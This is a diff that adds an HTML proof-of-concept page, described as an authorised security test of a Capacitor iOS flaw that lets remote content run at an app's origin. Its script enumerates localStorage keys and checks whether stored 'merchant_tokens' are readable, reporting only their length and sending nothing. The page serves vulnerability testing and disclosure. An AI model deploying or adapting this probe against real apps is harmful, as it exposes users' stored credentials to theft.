@@ -1,0 +1,25 @@
+<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WBX origin probe</title></head>
+<body style="font:13px ui-monospace,Menlo,monospace;padding:12px">
+<!--
+  Authorised security test artifact (CVE-2025-xxxxx class: Capacitor iOS
+  _capacitor_http_interceptor_ remote-content-at-app-origin).
+  This is a READ-ONLY ORIGIN PROBE. It deliberately does NOT exfiltrate:
+  it prints key NAMES and LENGTHS only, never values, and makes no network
+  requests. Safe to host publicly. Delete after the test.
+-->
+<h3>WBX origin probe</h3><pre id=o>running…</pre>
+<script>
+var L=[];
+L.push("served-from = https://shazsyed.github.io (public CA, no custom trust)");
+L.push("document.URL = "+location.href.slice(0,80));
+L.push("origin       = "+location.origin);
+try{
+  var k=Object.keys(localStorage);
+  L.push("localStorage keys = "+(k.length?k.join(" | "):"(none)"));
+  var t=localStorage.getItem("merchant_tokens");
+  L.push("merchant_tokens readable = "+(t!==null));
+  L.push("merchant_tokens length   = "+(t?t.length:0)+"   (value NOT shown/sent)");
+}catch(e){ L.push("localStorage BLOCKED: "+e); }
+document.getElementById("o").textContent=L.join("\n");
+</script></body></html>
